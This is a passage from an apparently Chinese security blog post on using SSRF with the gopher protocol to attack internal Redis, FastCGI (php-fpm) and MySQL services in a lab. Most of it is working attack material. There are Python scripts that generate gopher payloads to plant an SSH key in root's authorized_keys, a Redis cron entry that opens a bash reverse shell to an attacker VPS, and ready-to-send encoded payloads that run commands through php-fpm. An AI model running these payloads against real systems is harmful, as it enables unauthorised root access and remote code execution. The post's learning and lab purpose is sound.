AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E/45IEs/9a6AWfXb6iwzo+D62y8MOmt+sct27ZxGOcRR95FT6zrfFxqt2h56oLwml/Trxy5sExSQ/cvvLwUTWb3ntJYyh2eGkQnOf2d+ax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH/4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd/bWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ/NnHKyWtI/OzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe+XqQnjxtk4giopiFfRu8winE9scqlIA5Iu/d3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg/OOhoA3iKNhJ/JT31TU9E24dGh2Ei8K+PpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl+SOsVHpNqwFcrgsq/WR5BGqnu54vTTdJh0pSrl+tniHEnWWU= root@whoami  </span><br><span class=\"line\">&#x27;  </span><br><span class=\"line\">config set dir /root/.ssh/  </span><br><span class=\"line\">config set dbfilename authorized\\_keys  </span><br><span class=\"line\">save</span><br></pre></td></tr></table></figure>\n\n<p>然后编写脚本，将其转化为Gopher协议的格式：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import urllib</span><br><span class=\"line\">protocol=&quot;gopher://&quot;</span><br><span class=\"line\">ip=&quot;192.168.52.131&quot;</span><br><span class=\"line\">port=&quot;6379&quot;</span><br><span class=\"line\">ssh\\_pub=&quot;\\\\n\\\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E/45IEs/9a6AWfXb6iwzo+D62y8MOmt+sct27ZxGOcRR95FT6zrfFxqt2h56oLwml/Trxy5sExSQ/cvvLwUTWb3ntJYyh2eGkQnOf2d+ax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH/4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd/bWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ/NnHKyWtI/OzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe+XqQnjxtk4giopiFfRu8winE9scqlIA5Iu/d3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg/OOhoA3iKNhJ/JT31TU9E24dGh2Ei8K+PpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl+SOsVHpNqwFcrgsq/WR5BGqnu54vTTdJh0pSrl+tniHEnWWU= root@whoami\\\\n\\\\n&quot;</span><br><span class=\"line\">filename=&quot;authorized\\_keys&quot;</span><br><span class=\"line\">path=&quot;/root/.ssh/&quot;</span><br><span class=\"line\">passwd=&quot;&quot;</span><br><span class=\"line\">cmd=\\[&quot;flushall&quot;,</span><br><span class=\"line\">\t &quot;set 1 &#123;&#125;&quot;.format(ssh\\_pub.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)),</span><br><span class=\"line\">\t &quot;config set dir &#123;&#125;&quot;.format(path),</span><br><span class=\"line\">\t &quot;config set dbfilename &#123;&#125;&quot;.format(filename),</span><br><span class=\"line\">\t &quot;save&quot;</span><br><span class=\"line\">\t \\]</span><br><span class=\"line\">if passwd:</span><br><span class=\"line\">\tcmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))</span><br><span class=\"line\">payload=protocol+ip+&quot;:&quot;+port+&quot;/\\_&quot;</span><br><span class=\"line\">def redis\\_format(arr):</span><br><span class=\"line\">\tCRLF=&quot;\\\\r\\\\n&quot;</span><br><span class=\"line\">\tredis\\_arr = arr.split(&quot; &quot;)</span><br><span class=\"line\">\tcmd=&quot;&quot;</span><br><span class=\"line\">\tcmd+=&quot;\\*&quot;+str(len(redis\\_arr))</span><br><span class=\"line\">\tfor x in redis\\_arr:</span><br><span class=\"line\">\t\tcmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;)</span><br><span class=\"line\">\tcmd+=CRLF</span><br><span class=\"line\">\treturn cmd</span><br><span class=\"line\"></span><br><span class=\"line\">if \\_\\_name\\_\\_==&quot;\\_\\_main\\_\\_&quot;:</span><br><span class=\"line\">\tfor x in cmd:</span><br><span class=\"line\">\t\tpayload += urllib.quote(redis\\_format(x))</span><br><span class=\"line\">\tprint payload</span><br></pre></td></tr></table></figure>\n\n<p>生成的payload同样进行url二次编码，然后利用Ubuntu服务器上的SSRF打过去：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssrf.php?url=gopher%3A%2F%2F192.168.52.131%3A6379%2F\\_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%2524568%250D%250A%250A%250Assh-rsa%2520AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E%2F45IEs%2F9a6AWfXb6iwzo%252BD62y8MOmt%252Bsct27ZxGOcRR95FT6zrfFxqt2h56oLwml%2FTrxy5sExSQ%2FcvvLwUTWb3ntJYyh2eGkQnOf2d%252Bax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH%2F4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd%2FbWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ%2FNnHKyWtI%2FOzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe%252BXqQnjxtk4giopiFfRu8winE9scqlIA5Iu%2Fd3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg%2FOOhoA3iKNhJ%2FJT31TU9E24dGh2Ei8K%252BPpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl%252BSOsVHpNqwFcrgsq%2FWR5BGqnu54vTTdJh0pSrl%252BtniHEnWWU%253D%2520root%2540whoami%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252411%250D%250A%2Froot%2F.ssh%2F%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%252415%250D%250Aauthorized\\_keys%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A</span><br></pre></td></tr></table></figure>\n\n<p>如下图，成功在主机192.168.52.131上面写入SSH公钥：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598028_5fffc68c0f8d37e46a560.png!small\"\n                        alt=\"image-20210113185745287\"\n                 ></p>\n<p>如下图，ssh连接成功：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598029_5fffc68d802a6e5c757d2.png!small\"\n                        alt=\"image-20210113193746288\"\n                 ></p>\n<h3 id=\"创建计划任务反弹Shell\"><a href=\"#创建计划任务反弹Shell\" class=\"headerlink\" title=\"创建计划任务反弹Shell\"></a>创建计划任务反弹Shell</h3><p><strong>注意：这个只能在Centos上使用，别的不行，好像是由于权限的问题。</strong></p>\n<p>构造redis的命令如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flushall  </span><br><span class=\"line\">set 1 &#x27;\\\\n\\\\n\\*/1 \\* \\* \\* \\* bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1\\\\n\\\\n&#x27;  </span><br><span class=\"line\">config set dir /var/spool/cron/  </span><br><span class=\"line\">config set dbfilename root  </span><br><span class=\"line\">save  </span><br><span class=\"line\"></span><br><span class=\"line\">// 47.xxx.xxx.72为攻击者vps的IP</span><br><span class=\"line\"></span><br><span class=\"line\">然后编写脚本，将其转化为Gopher协议的格式：</span><br><span class=\"line\"></span><br><span class=\"line\">import urllib</span><br><span class=\"line\">protocol=&quot;gopher://&quot;</span><br><span class=\"line\">ip=&quot;192.168.52.131&quot;</span><br><span class=\"line\">port=&quot;6379&quot;</span><br><span class=\"line\">reverse\\_ip=&quot;47.xxx.xxx.72&quot;</span><br><span class=\"line\">reverse\\_port=&quot;2333&quot;</span><br><span class=\"line\">cron=&quot;\\\\n\\\\n\\\\n\\\\n\\*/1 \\* \\* \\* \\* bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\\\\n\\\\n\\\\n\\\\n&quot;%(reverse\\_ip,reverse\\_port)</span><br><span class=\"line\">filename=&quot;root&quot;</span><br><span class=\"line\">path=&quot;/var/spool/cron&quot;</span><br><span class=\"line\">passwd=&quot;&quot;</span><br><span class=\"line\">cmd=\\[&quot;flushall&quot;,</span><br><span class=\"line\">\t &quot;set 1 &#123;&#125;&quot;.format(cron.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)),</span><br><span class=\"line\">\t &quot;config set dir &#123;&#125;&quot;.format(path),</span><br><span class=\"line\">\t &quot;config set dbfilename &#123;&#125;&quot;.format(filename),</span><br><span class=\"line\">\t &quot;save&quot;</span><br><span class=\"line\">\t \\]</span><br><span class=\"line\">if passwd:</span><br><span class=\"line\">\tcmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))</span><br><span class=\"line\">payload=protocol+ip+&quot;:&quot;+port+&quot;/\\_&quot;</span><br><span class=\"line\">def redis\\_format(arr):</span><br><span class=\"line\">\tCRLF=&quot;\\\\r\\\\n&quot;</span><br><span class=\"line\">\tredis\\_arr = arr.split(&quot; &quot;)</span><br><span class=\"line\">\tcmd=&quot;&quot;</span><br><span class=\"line\">\tcmd+=&quot;\\*&quot;+str(len(redis\\_arr))</span><br><span class=\"line\">\tfor x in redis\\_arr:</span><br><span class=\"line\">\t\tcmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;)</span><br><span class=\"line\">\tcmd+=CRLF</span><br><span class=\"line\">\treturn cmd</span><br><span class=\"line\"></span><br><span class=\"line\">if \\_\\_name\\_\\_==&quot;\\_\\_main\\_\\_&quot;:</span><br><span class=\"line\">\tfor x in cmd:</span><br><span class=\"line\">\t\tpayload += urllib.quote(redis\\_format(x))</span><br><span class=\"line\">\tprint payload</span><br></pre></td></tr></table></figure>\n\n<p>生成的payload同样进行url二次编码，然后利用Ubuntu服务器上的SSRF打过去，即可在目标主机192.168.52.131上写入计划任务，等到时间后，攻击者vps上就会获得目标主机的shell：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202362.jpeg\"\n                        alt=\"image-20210113184927766\"\n                 ></p>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/qq_45521281/article/details/106532501\" >[GKCTF2020]EZ三剑客-EzWeb<i class=\"fas fa-external-link-alt\"></i></a>这道题利用的就是攻击内网Redis的思路。</p>\n<h2 id=\"攻击内网FastCGI\"><a href=\"#攻击内网FastCGI\" class=\"headerlink\" title=\"攻击内网FastCGI\"></a>攻击内网FastCGI</h2><p>FastCGI指快速通用网关接口（Fast Common Gateway Interface／FastCGI）是一种让交互程序与Web服务器通信的协议。FastCGI是早期通用网关接口（CGI）的增强版本。FastCGI致力于减少网页服务器与CGI程序之间交互的开销，从而使服务器可以同时处理更多的网页请求。</p>\n<blockquote>\n<p>众所周知，在网站分类中存在一种分类就是静态网站和动态网站，两者的区别就是静态网站只需要<strong>通过浏览器进行解析</strong>，而动态网站需要一个<strong>额外的编译解析</strong>的过程。以Apache为例，当访问动态网站的主页时，根据容器的配置文件，它知道这个页面不是静态页面，Web容器就会把这个请求进行简单的处理，然后如果使用的是CGI，就会启动CGI程序（对应的就是PHP解释器）。接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以规定CGI规定的格式返回处理后的结果，退出进程，Web server再把结果返回给浏览器。这就是一个完整的动态PHP Web访问流程。</p>\n<p>这里说的是使用CGI，而FastCGI就相当于高性能的CGI，与CGI不同的是它<strong>像一个常驻的CGI</strong>，在启动后会一直运行着，不需要每次处理数据时都启动一次，<strong>所以FastCGI的主要行为是将CGI解释器进程保持在内存中</strong>，并因此获得较高的性能 。</p>\n</blockquote>\n<h3 id=\"php-fpm\"><a href=\"#php-fpm\" class=\"headerlink\" title=\"php-fpm\"></a>php-fpm</h3><p>FPM（FastCGI 进程管理器）可以说是FastCGI的一个具体实现，用于替换 PHP FastCGI 的大部分附加功能，对于高负载网站是非常有用的。</p>\n<p>攻击FastCGI的主要原理就是，在设置环境变量实际请求中会出现一个<code>SCRIPT_FILENAME&#39;: &#39;/var/www/html/index.php</code>这样的键值对，它的意思是php-fpm会执行这个文件，但是这样即使能够控制这个键值对的值，但也只能控制php-fpm去执行某个已经存在的文件，不能够实现一些恶意代码的执行。</p>\n<p>而在PHP 5.3.9后来的版本中，PHP增加了安全选项导致只能控制php-fpm执行一些php、php4这样的文件，这也增大了攻击的难度。但是好在PHP允许通过PHP_ADMIN_VALUE和PHP_VALUE去动态修改PHP的设置。</p>\n<p>那么当设置PHP环境变量为：<code>auto_prepend_file = php://input;allow_url_include = On</code>时，就会在执行PHP脚本之前包含环境变量<code>auto_prepend_file</code>所指向的文件内容，<code>php://input</code>也就是接收POST的内容，这个我们可以在FastCGI协议的body控制为恶意代码，这样就在理论上实现了php-fpm任意代码执行的攻击。</p>\n<p>详情请见：<a class=\"link\"   href=\"https://bbs.ichunqiu.com/thread-58455-1-1.html\" >《SSRF系列之攻击FastCGI》<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>测试环境：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202250.jpeg\"\n                        alt=\"image-20210113225311760\"\n                 ></p>\n<p>WEB服务器Ubuntu（192.168.43.166）存在SSRF漏洞：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598034_5fffc69243862a502d80a.png!small\"\n                        alt=\"image-20210113211319025\"\n                 ></p>\n<p>并且WEB服务器Ubuntu上存在FastCGI，那么我们就可以利用其SSRF漏洞去攻击其本地的FastCGI。</p>\n<blockquote>\n<p>假设在配置fpm时，将监听的地址设为了0.0.0.0:9000，那么就会产生php-fpm未授权访问漏洞，此时攻击者可以无需利用SSRF从服务器本地访问的特性，直接与服务器9000端口上的php-fpm进行通信，进而可以用fcgi_exp等工具去攻击服务器上的php-fpm实现任意代码执行。</p>\n<p>当内网中的其他主机上配置有fpm，且监听的地址为0.0.0.0:9000时，那么这台主机就可能存在php-fpm未授权访问漏洞，我们便可以利用Ubuntu服务器上的SSRF去攻击他，如果内网中的这台主机不存在php-fpm未授权访问漏洞，那么就直接利用Ubuntu服务器上的SSRF去攻击他显然是不行的。</p>\n</blockquote>\n<h3 id=\"使用fcgi-exp工具攻击\"><a href=\"#使用fcgi-exp工具攻击\" class=\"headerlink\" title=\"使用fcgi_exp工具攻击\"></a>使用fcgi_exp工具攻击</h3><p>下载地址：<a class=\"link\"   href=\"https://github.com/piaca/fcgi_exp\" >https://github.com/piaca/fcgi_exp<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>这个工具主要是用来攻击未授权访问php-fpm的，可用来测试是否可以直接攻击php-fpm，但需要自己将生成的payload进行转换一下。</p>\n<p>该工具需要go语言环境，下载后进入目录执行如下命令进行编译：</p>\n<p>go build fcgi_exp.go                    # 编译fcgi_exp.go</p>\n<p>编译完成后，我们在攻击机上使用<code>nc -lvvp 2333 &gt; fcg_exp.txt</code>监听2333 端口来接收fcgi_exp生成的payload，另外再开启一个终端使用下面的命令来向2333端口发送payload：</p>\n<p>.&#x2F;fcgi_exp system 127.0.0.1 2333 &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php “id”</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202135.jpeg\"\n                        alt=\"image-20210113205718209\"\n                 ></p>\n<p>生成的fcg_exp.txt文件的内容是接收到的payload，内容如下：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598036_5fffc694cc3e3da7a21ec.png!small\"\n                        alt=\"image-20210113205857913\"\n                 ></p>\n<p>然后对fcg_exp.txt文件里的payload进行url编码，这里通过如下脚本实现（脚本是我从网上白嫖的嘿嘿）：</p>\n<p># -*- coding: UTF-8 -*-<br>from urllib.parse import quote, unquote, urlencode  </p>\n<p>file &#x3D; open(‘fcg_exp.txt’,’r’)<br>payload &#x3D; file.read()<br>print(“gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_“+quote(payload).replace(“%0A”,”%0D”).replace(“%2F”,”&#x2F;“))</p>\n<p>执行上面的python脚本生成如下payload：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202737.jpeg\"\n                        alt=\"image-20210113210102251\"\n                 ></p>\n<p>这里还要对上面的payload进行二次url编码，然后将最终的payload内容放到?url&#x3D;后面发送过去：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A9000%2F\\_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2514%2504%2500%250F%2510SERVER\\_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE\\_ADDR127.0.0.1%250F%2508SERVER\\_PROTOCOLHTTP%2F1.1%250E%2502CONTENT\\_LENGTH56%250E%2504REQUEST\\_METHODPOST%2509%255BPHP\\_VALUEallow\\_url\\_include%2520%253D%2520On%250Ddisable\\_functions%2520%253D%2520%250Dsafe\\_mode%2520%253D%2520Off%250Dauto\\_prepend\\_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT\\_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT\\_ROOT%2F%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25008%2500%2500%253C%253Fphp%2520system%2528%2527id%2527%2529%253Bdie%2528%2527-----0vcdb34oju09b8fd-----%250D%2527%2529%253B%253F%253E</span><br></pre></td></tr></table></figure>\n\n<p>如下图所示，命令执行成功：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598040_5fffc6982e020c76d98d2.png!small\"\n                        alt=\"image-20210113211227610\"\n                 ></p>\n<h3 id=\"使用Gopherus工具攻击\"><a href=\"#使用Gopherus工具攻击\" class=\"headerlink\" title=\"使用Gopherus工具攻击\"></a>使用Gopherus工具攻击</h3><p>下载地址：<a class=\"link\"   href=\"https://github.com/tarunkant/Gopherus\" >https://github.com/tarunkant/Gopherus<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>该工具可以帮你生成符合Gopher协议格式的payload，以利用SSRF攻击Redis、FastCGI、MySql等内网应用。</p>\n<p>使用Gopherus工具生成攻击FastCGI的payload：</p>\n<p>python gopherus.py –exploit fastcgi<br>&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php    # 这里输入的是一个已知存在的php文件<br>id    # 输入一个你要执行的命令</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598041_5fffc69924b889c84f935.png!small\"\n                        alt=\"image-20201206134630782\"\n                 ></p>\n<p>然后还是将得到的payload进行二次url编码，将最终得到的payload放到?url&#x3D;后面打过去过去：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssrf.php?url=gopher%3A//127.0.0.1%3A9000/\\_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER\\_SOFTWAREgo%2520/%2520fcgiclient%2520%250B%2509REMOTE\\_ADDR127.0.0.1%250F%2508SERVER\\_PROTOCOLHTTP/1.1%250E%2502CONTENT\\_LENGTH54%250E%2504REQUEST\\_METHODPOST%2509KPHP\\_VALUEallow\\_url\\_include%2520%253D%2520On%250Adisable\\_functions%2520%253D%2520%250Aauto\\_prepend\\_file%2520%253D%2520php%253A//input%250F%2517SCRIPT\\_FILENAME/var/www/html/index.php%250D%2501DOCUMENT\\_ROOT/%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25006%2504%2500%253C%253Fphp%2520system%2528%2527id%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500</span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202253.jpeg\"\n                        alt=\"image-20210113211649519\"\n                 ></p>\n<p>命令执行成功。</p>\n<h2 id=\"攻击内网MySql\"><a href=\"#攻击内网MySql\" class=\"headerlink\" title=\"攻击内网MySql\"></a>攻击内网MySql</h2><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202474.jpeg\"\n                        alt=\"20210113152106.png\"\n                 ></p>\n<p>首先我们要先了解一下MySql数据库用户认证的过程。MySQL分为服务端和客户端。MySQL数据库用户认证采用的是 挑战&#x2F;应答 的方式，即服务器生成该挑战码(scramble)并发送给客户端，客户端用挑战码将自己的密码进行加密后，并将相应的加密结果返回给服务器，服务器本地用挑战码的将用户的密码加密，如果加密的结果和用户返回的加密的结果相同则用户认证成功，从而完成用户认证的过程。</p>\n<p>登录时需要用服务器发来的挑战码(scramble)将密码加密，但是当数据库用户密码为空时，加密后的密文也为空。客户端给服务端发的认证包就是相对固定的了。这样就无需交互了，可以通过Gopher协议来直接发送了。</p>\n<p>测试环境如下：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598044_5fffc69c8db745aea464b.png!small\"\n                        alt=\"image-20210113225607672\"\n                 ></p>\n<p>Ubuntu服务器为WEB服务器，存在SSRF漏洞，且上面运行着MySql服务，用户名为whoami，密码为空并允许空密码登录。</p>\n<p>下面我们还是使用Gopherus工具生成攻击Ubuntu服务器本地MySql的payload：</p>\n<p>python gopherus.py –exploit mysql<br>whoami    # 登录用的用户名<br>show databases;    # 登录后要执行的sql语句</p>\n<p>生成如下payload：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598046_5fffc69e8d085bc01c7a3.png!small\"\n                        alt=\"image-20210114004602164\"\n                 ></p>\n<p>将得到的paylaod进行url二次编码，然后将最终的payload内容放到?url&#x3D;后面发送打过去就行了。但是我这里失败了，不知道为什么……</p>\n<h2 id=\"Ending……\"><a href=\"#Ending……\" class=\"headerlink\" title=\"Ending……\"></a>Ending……</h2><p>推荐一个SSRF练习靶场：</p>\n<ul>\n<li>ssrf-lab：<a class=\"link\"   href=\"https://github.com/fengwenhua/ssrf-lab\" >https://github.com/fengwenhua/ssrf-lab<i class=\"fas fa-external-link-alt\"></i></a></li>\n</ul>\n<p>该靶场有一个好看又简洁的界面，提供了最基本的 REST API 和客户端 WebHook 功能用于 SSRF 测试。配置请看：<a class=\"link\"   href=\"https://www.heibai.org/post/1287.html\" >https://www.heibai.org/post/1287.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202809.jpeg\"\n                        alt=\"20210112124413.jpg\"\n                 ></p>\n<p>本文多为笔者的学习总结，若有不当的地方还望各位经过的路过的大佬多多点评。</p>\n<p>个人博客：<a class=\"link\"   href=\"https://whoamianony.top/\" >https://whoamianony.top/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<blockquote>\n<p>参考： <a class=\"link\"   href=\"https://blog.csdn.net/Ping_Pig/article/details/99412487\" >https://blog.csdn.net/Ping_Pig&#x2F;article&#x2F;details&#x2F;99412487<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://www.cnblogs.com/iors/p/9777571.html\" >https://www.cnblogs.com/iors/p/9777571.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/qq_43625917/article/details/104528645?utm_source=app\" >https://blog.csdn.net/qq_43625917&#x2F;article&#x2F;details&#x2F;104528645?utm_source&#x3D;app<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://xz.aliyun.com/t/2115\" >https://xz.aliyun.com/t/2115<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/weixin_36343353/article/details/112277580\" >https://blog.csdn.net/weixin_36343353&#x2F;article&#x2F;details&#x2F;112277580<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/cj_Allen/article/details/106855893\" >https://blog.csdn.net/cj_Allen&#x2F;article&#x2F;details&#x2F;106855893<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/#Redis%E9%85%8D%E5%90%88gopher%E5%8D%8F%E8%AE%AE%E8%BF%9B%E8%A1%8CSSRF\" >https://www.redteaming.top/2019/07/15/浅析Redis中SSRF的利用/#Redis配合gopher协议进行SSRF<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://bbs.ichunqiu.com/thread-58455-1-1.html\" >https://bbs.ichunqiu.com/thread-58455-1-1.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://blog.chaitin.cn/gopher-attack-surfaces/\" >https://blog.chaitin.cn/gopher-attack-surfaces/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://www.anquanke.com/post/id/197431#h2-6\" >https://www.anquanke.com/post/id/197431#h2-6<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://www.anquanke.com/post/id/145519#h2-14\" >https://www.anquanke.com/post/id/145519#h2-14<i class=\"fas fa-external-link-alt\"></i></a></p>\n</blockquote>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid 